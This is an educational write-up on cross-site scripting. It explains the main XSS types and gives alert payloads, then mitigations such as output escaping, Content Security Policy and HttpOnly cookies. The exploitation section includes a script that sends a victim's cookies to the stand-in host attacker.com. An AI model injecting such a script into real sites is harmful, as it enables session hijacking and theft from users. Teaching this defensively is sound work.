# [Severity 7] Cross-Site Scripting (XSS)

## Description
Cross-Site Scripting (XSS) is a client-side vulnerability where an attacker injects malicious scripts into a web page viewed by other users. This can lead to session hijacking, defacement, redirection to malicious websites, or data theft. XSS occurs when user-supplied input is included in the page's output without proper validation or encoding, allowing JavaScript, HTML, or other executable code to be injected.

There are three main types of XSS:
- **Stored (Persistent) XSS**: Malicious scripts are stored on the server (e.g., in a database) and executed whenever a user accesses the affected page.
- **Reflected (Non-Persistent) XSS**: Scripts are injected into a URL or form and only executed when a user follows the malicious link or submits the form.
- **DOM-based XSS**: Scripts are executed as a result of modifying the Document Object Model (DOM) in the browser, without direct involvement from the server.

## Exploitation Method

### 1. Identify Input Fields for Injection
- **Goal**: Locate input fields on the web page (such as search bars, comment sections, contact forms, or any field that reflects input back onto the page) where JavaScript can potentially be injected and executed.
- **Common Signs**: If you see user input being displayed without modification (e.g., directly echoed in comments), it may be vulnerable to XSS.

**Example**:
In a comment section, try injecting a simple payload like `<script>alert('XSS')</script>`. If you see an alert pop up, this indicates a potential XSS vulnerability, as the script was executed by the browser.

### 2. Stored XSS vs. Reflected XSS

#### Stored (Persistent) XSS:
- In stored XSS, the injected code is stored on the server and executed every time the page is loaded.
- **Example**: In a forum post, if an attacker enters `<script>alert('XSS')</script>`, this code could be stored in the database and executed for every user who views that post. Attackers could replace the alert with malicious code that steals cookies, performs redirects, or injects fake forms for credential harvesting.

#### Reflected (Non-Persistent) XSS:
- Reflected XSS occurs when the injected code is included in the page response (usually via the URL). This type of attack is often delivered through phishing links.
- **Example**: An attacker could craft a URL like `https://example.com/search?query=<script>alert('XSS')</script>` and send it to a victim. When the victim clicks the link, the alert code is executed in their browser if the application is vulnerable.

### 3. Stealing Cookies and Sensitive Data
- **Goal**: Use JavaScript to steal sensitive information (such as session cookies) that could be used for session hijacking, allowing the attacker to impersonate the user.
- **How to Execute**: Replace the alert function with a script that sends data to the attacker's server.

**Example**:
```html
       <script>
       // Sends the user's cookies to a malicious server
       var img = new Image();
       img.src = "http://attacker.com/steal?cookie=" + document.cookie;
      </script>
```
# Explanation
This code creates an image request to the attacker's server (attacker.com), passing along the victim's cookies as parameters in the URL. If the user is logged in, the cookie might contain a session ID or other sensitive data that can be used for hijacking.

## Mitigation Techniques
To protect against XSS, a layered approach is recommended, combining input validation, output encoding, and security headers.

### 1. Sanitize and Validate User Input
- **Why**: Prevent harmful characters from being input into your application in the first place.
- **How**: Strip or replace HTML tags, JavaScript code, and other potentially dangerous content from user input. Avoid blacklisting specific characters and instead whitelist only safe content (such as plain text or limited HTML tags if necessary).
- **Example**: For a comment input, remove tags or limit allowed characters to alphanumeric, punctuation, etc., to avoid code injection.

### 2. Escape HTML Special Characters
- **Why**: Prevent malicious input from being interpreted as HTML or JavaScript.
- **How**: Ensure that characters such as `<`, `>`, `"`, and `&` are converted to their HTML entities (`&lt;`, `&gt;`, `&quot;`, and `&amp;`) when displaying user input.
- **Example**: If a user enters `<script>alert('XSS')</script>`, it should be displayed as `&lt;script&gt;alert('XSS')&lt;/script&gt;`, preventing it from being executed.

### 3. Implement Content Security Policy (CSP)
- **Why**: CSP allows you to control the sources from which scripts, images, styles, and other resources can be loaded, significantly reducing the impact of XSS.
- **How**: Configure a CSP header to restrict JavaScript execution to specific, trusted domains.
- **Example**: A CSP header that only allows JavaScript from `self` and `trusted.com`:
    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
    ```
- **Note**: CSP can be a complex but highly effective tool, as it limits which domains can execute code, even if the attacker manages to inject a script.

### 4. Use HTTP-Only and Secure Cookies
- **Why**: Prevent cookies from being accessed via JavaScript, reducing the risk of session hijacking if XSS is present.
- **How**: Set cookies with the `HttpOnly` and `Secure` flags. `HttpOnly` prevents JavaScript from accessing cookies, and `Secure` ensures they are only sent over HTTPS.
- **Example**: In server-side code, you might set a cookie like this:
    ```javascript
    Set-Cookie: sessionId=abc123; HttpOnly; Secure;
    ```

### 5. Employ JavaScript Libraries with Built-In XSS Protection
- **Why**: Some frameworks have strong protections against XSS vulnerabilities by design.
- **Examples**:
  - *ReactJS and VueJS*: Escape user inputs by default, reducing the risk of XSS unless developers explicitly choose to bypass this behavior.
  - *AngularJS*: Enforces a security policy where dangerous code is treated as unsafe by default, making it harder for XSS vulnerabilities to occur.
